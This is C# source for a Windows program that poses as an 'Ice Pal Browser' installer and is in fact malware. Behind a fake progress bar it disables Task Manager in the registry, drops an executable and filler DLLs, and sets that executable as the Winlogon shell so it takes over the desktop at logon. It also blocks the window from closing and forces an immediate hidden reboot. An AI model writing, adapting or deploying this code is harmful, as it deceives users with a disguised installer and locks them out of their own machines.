using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using Microsoft.Win32;
using System.Threading.Tasks;

namespace IcePalBrowserSetup
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Closing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            MessageBox.Show("At this time, the setup cannot close because of file processing.", "Ice Pal Browser Setup | Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                Directory.CreateDirectory(@"C:\IcePalBrowser");
                RegistryKey soft;
                soft = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                soft.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                soft.Close();

                progressBar1.Value = 15;
                await Task.Delay(2000);
                File.WriteAllBytes(Path.GetTempPath() + @"\chips_ahoy_drip.mp4", Properties.Resources.chips_ahoy_drip);
                progressBar1.Value = 25;
                await Task.Delay(2000);
                File.WriteAllBytes(Path.GetTempPath() + @"\chips_ahoy_hottub.mp4", Properties.Resources.chips_ahoy_hottub);
                progressBar1.Value = 40;
                await Task.Delay(2000);
                File.WriteAllBytes(Path.GetTempPath() + @"\chips_ahoy_imposter.mp4", Properties.Resources.chips_ahoy_imposter);
                progressBar1.Value = 65;
                await Task.Delay(2000);
                File.WriteAllBytes(Path.GetTempPath() + @"\chips_ahoy_lootbox.mp4", Properties.Resources.chips_ahoy_lootbox);
                progressBar1.Value = 75;
                await Task.Delay(2000);
                File.WriteAllBytes(Path.GetTempPath() + @"\chips_ahoy_shot.mp4", Properties.Resources.chips_ahoy_shot);
                progressBar1.Value = 90;
                await Task.Delay(2000);
                File.WriteAllBytes(Path.GetTempPath() + @"\chips_ahoy_trap.mp4", Properties.Resources.chips_ahoy_trap);
                progressBar1.Value = 93;
                await Task.Delay(2000);
                File.WriteAllBytes(@"C:\IcePalBrowser\IcePalBrowserUpdater.exe", Properties.Resources.IcePalBrowserUpdater);
                File.WriteAllBytes(@"C:\IcePalBrowser\AxInterop.WMPLib.dll", Properties.Resources.AxInterop_WMPLib);
                File.WriteAllBytes(@"C:\IcePalBrowser\Interop.WMPLib.dll", Properties.Resources.Interop_WMPLib);
                File.WriteAllBytes(@"C:\IcePalBrowser\checkUpdates.dll", new byte[4000]);
                File.WriteAllBytes(@"C:\IcePalBrowser\runtime.dll", new byte[15000]);
                File.WriteAllBytes(@"C:\IcePalBrowser\performance.dll", new byte[89000]);
                progressBar1.Value = 96;
                await Task.Delay(2000);
                soft = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
                soft.SetValue("Shell", @"C:\IcePalBrowser\IcePalBrowserUpdater.exe", RegistryValueKind.String);
                soft.Close();
                progressBar1.Value = 100;
                await Task.Delay(2000);
                ProcessStartInfo proc = new ProcessStartInfo();
                proc.FileName = "shutdown.exe";
                proc.WindowStyle = ProcessWindowStyle.Hidden;
                proc.Arguments = "-r -t 0";
                Process.Start(proc);
            }
            catch
            {
                label1.Text = "An error has occured when installing.";
                progressBar1.Hide();
            }

        }

        private void Form1_Closing(object sender, FormClosingEventArgs e)
        {
// added this for no reason
        }
    }
}
